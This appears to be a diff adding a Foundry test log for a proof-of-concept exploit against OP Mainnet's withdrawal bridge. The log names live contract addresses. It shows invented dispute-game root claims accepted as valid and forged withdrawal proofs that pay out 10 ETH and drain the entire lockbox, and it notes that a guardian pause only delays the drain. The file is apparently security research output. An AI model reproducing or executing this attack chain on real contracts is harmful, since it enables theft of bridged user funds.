@@ -1,0 +1,130 @@
+Warning: This is a nightly build of Foundry. It is recommended to use the latest stable version. To mute this warning set `FOUNDRY_DISABLE_NIGHTLY_WARNING` in your environment. 
+
+No files changed, compilation skipped
+
+Ran 6 tests for test/FullChainPoC.t.sol:FullChainPoC
+[PASS] test_0_liveParams() (gas: 541962)
+Logs:
+  === OP Mainnet live parameters ===
+    portal                      : 0xbEb5Fc579115071764c7423A4f12eDde41f106Ed
+    portal version              : 5.6.1
+    lockbox                     : 0x322b47Ff1FA8D5611F761e3E275C45B71b294D43
+    lockbox version             : 1.3.1
+    ASR                         : 0x23B2C62946350F4246f9f9D027e071f0264FD113
+    DGF                         : 0xe5965Ab5962eDc7477C8520243A95517CD252fA9
+    respectedGameType           : 8
+    gameImpls(type)             : 0x2DDA3584b51eF5236f7726Dea5A0FB6B3cA94AeC
+    initBond (wei)              : 80000000000000000
+    proofMaturityDelay (s)      : 604800
+    disputeGameFinalityDelay (s): 302400
+    lockbox balance (wei)       : 187604758921401299096607
+    lockbox paused              : false
+    portal paused               : false
+    ASR paused                  : false
+    ASR retirementTimestamp     : 1753379243
+    ASR anchor root             : 0xccee894b3e1ca8650d147b0f1d5ce49d4079ca5a47e5b39253217ffa8c6cc816
+    ASR anchor l2Block          : 155256555
+    portal.l2Sender             : 0x000000000000000000000000000000000000dEaD
+    portal.ethLockbox           : 0x322b47Ff1FA8D5611F761e3E275C45B71b294D43
+    lockbox.authorizedPortals   : true
+
+[PASS] test_A_inventedRootBecomesCanonical() (gas: 941574)
+Logs:
+  === test_A: an invented root claim becomes canonical ===
+    -- dispute game --
+       address        : 0x5d3117C678c57d9Eb6D2fA318F3ac9848c1563E1
+       index          : 19097
+       gameType       : 8
+       rootClaim      : 0x1885f2d387422eb0924d958cf3bd81b70ae5a2a6b3864c21f57d5117e1db0eea
+       l2BlockNumber  : 155256556
+       status         : 2 (2 = DEFENDER_WINS)
+       claimDataLen   : 1
+       isGameClaimValid: true
+    isGameClaimValid returned true for a value nobody ever computed
+
+[PASS] test_B_forgedProofPaysOut() (gas: 1505180)
+Logs:
+  === test_B: forged proof -> 10 ETH out of the lockbox ===
+    -- forged proof (built offline, no L2) --
+       withdrawalHash : 0xc877e2fb23f564516cb3bafed51f471c8ab87bfff38be463a416580fab14a9d6
+       storageRoot    : 0x36c4ebf8dd3a2d5ae6f62e1a1869e9baf8756c66339ddb228c2810f7fecc1871
+       outputRoot     : 0x0d47b3f680aa76e42bc9b60905039d10faf584ffca00ffc2c8ff55a94a8e3285
+    -- dispute game --
+       address        : 0x93E9D157f07D06d674F3d83792A0689C9528b048
+       index          : 19097
+       gameType       : 8
+       rootClaim      : 0x0d47b3f680aa76e42bc9b60905039d10faf584ffca00ffc2c8ff55a94a8e3285
+       l2BlockNumber  : 155256556
+       status         : 2 (2 = DEFENDER_WINS)
+       claimDataLen   : 1
+       isGameClaimValid: true
+    -- proveWithdrawalTransaction accepted --
+    lockbox before (wei): 187604758921401299096607
+    lockbox after  (wei): 187594758921401299096607
+    attacker gain  (wei): 10000000000000000000
+    finalized           : true
+
+[PASS] test_C_drainEntireLockbox() (gas: 1507696)
+Logs:
+  === test_C: the entire lockbox in a single withdrawal ===
+    -- forged proof (built offline, no L2) --
+       withdrawalHash : 0xa94657def2b854d51fc136d7533af4e6d15598de1f84a8d4be20a8304d872f22
+       storageRoot    : 0x0a2eebd8aefecbc9d254cce3b83b18714307ab665d94a0b705cf18fc2c699d5b
+       outputRoot     : 0x6d1b91f837ab8153fedb4d3ba96f10ac70dc6309cde109769896804bccc2cb83
+    -- dispute game --
+       address        : 0xA8a7ef0f90D0823732CC128E8233010269584bd4
+       index          : 19097
+       gameType       : 8
+       rootClaim      : 0x6d1b91f837ab8153fedb4d3ba96f10ac70dc6309cde109769896804bccc2cb83
+       l2BlockNumber  : 155256556
+       status         : 2 (2 = DEFENDER_WINS)
+       claimDataLen   : 1
+       isGameClaimValid: true
+    -- proveWithdrawalTransaction accepted --
+    lockbox before (wei): 187604758921401299096607
+    lockbox after  (wei): 0
+    attacker gain  (wei): 187604758921401299096607
+    finalized           : true
+
+[PASS] test_D_guardianPauseBlocks() (gas: 1462946)
+Logs:
+  === test_D: guardian pause blocks the payout ===
+    -- forged proof (built offline, no L2) --
+       withdrawalHash : 0x67c040a78ad123250bd42a3c785e6ba0201c074614664136fe2dc4312945a959
+       storageRoot    : 0x2343ecd48638ae5f72db86d86a0b55c0961dbaf03d0f050f1cf0cccf6f189a2d
+       outputRoot     : 0x7686d1a7b19febbc02b0b46a12596ea0f26b1a4f31f4602c2ef958e4d391f573
+    -- dispute game --
+       address        : 0x728987Db1D54b37286F3f01845b5fA106f1502b7
+       index          : 19097
+       gameType       : 8
+       rootClaim      : 0x7686d1a7b19febbc02b0b46a12596ea0f26b1a4f31f4602c2ef958e4d391f573
+       l2BlockNumber  : 155256556
+       status         : 2 (2 = DEFENDER_WINS)
+       claimDataLen   : 1
+       isGameClaimValid: true
+    -- proveWithdrawalTransaction accepted --
+    real guardian, real SuperchainConfig.pause() -> finalize reverts
+
+[PASS] test_E_pauseExpiryReopens() (gas: 1623769)
+Logs:
+  === test_E: the pause expires and the payout resumes ===
+    -- forged proof (built offline, no L2) --
+       withdrawalHash : 0x27ebe51d7a6dba0787473fd9b67ef3640f2479934d731d7d4ec0b2a7cd2f340f
+       storageRoot    : 0x1f6fdabfaab596f08240eb413bc274bb40e5a6056aae8e071f529d57136aab07
+       outputRoot     : 0x61781c7a815745e53f32c09559bef272f6b5a76893269e44fca85cbcde95e19b
+    -- dispute game --
+       address        : 0x05a51f1Af07a4dB43Ed3ffD3DE7fF5A0aBBA8400
+       index          : 19097
+       gameType       : 8
+       rootClaim      : 0x61781c7a815745e53f32c09559bef272f6b5a76893269e44fca85cbcde95e19b
+       l2BlockNumber  : 155256556
+       status         : 2 (2 = DEFENDER_WINS)
+       claimDataLen   : 1
+       isGameClaimValid: true
+    -- proveWithdrawalTransaction accepted --
+    pause expiry (days) : 91
+    extracted      (wei): 1000000000000000000
+
+Suite result: ok. 6 passed; 0 failed; 0 skipped; finished in 23.26ms (72.06ms CPU time)
+
+Ran 1 test suite in 26.21ms (23.26ms CPU time): 6 tests passed, 0 failed, 0 skipped (6 total tests)
